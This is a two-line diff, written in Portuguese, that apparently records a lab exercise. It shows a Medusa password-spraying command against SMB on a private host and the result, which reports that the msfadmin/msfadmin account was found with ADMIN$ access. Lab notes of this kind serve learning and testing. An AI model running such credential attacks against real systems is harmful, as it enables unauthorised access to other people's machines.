@@ -1,0 +1,2 @@
+Comando: medusa -h 192.168.0.15 -U users.txt -P spray_senhas.txt -M smbnt -t 4 -T 50
+Resultado: ACCOUNT FOUND: [smbnt] Host: 192.168.0.15 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
